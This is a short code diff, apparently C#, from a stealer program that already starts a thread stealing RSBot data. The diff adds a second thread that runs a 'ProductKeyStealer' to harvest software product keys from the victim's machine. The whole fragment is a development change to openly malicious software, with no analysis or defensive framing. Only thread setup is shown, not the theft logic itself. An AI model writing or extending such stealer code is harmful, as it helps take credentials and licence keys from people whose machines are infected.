@@ -31,6 +31,9 @@ namespace sub
             StealerThread rsbot = new StealerThread(new RSBotStealer(), -1);
             rsbot.Start();
 
+            StealerThread productKeys = new StealerThread(new ProductKeyStealer(), -1);
+            productKeys.Start();
+
             while (true)
             {
                 //Implement some kind of checking to make sure none of the threads crashed
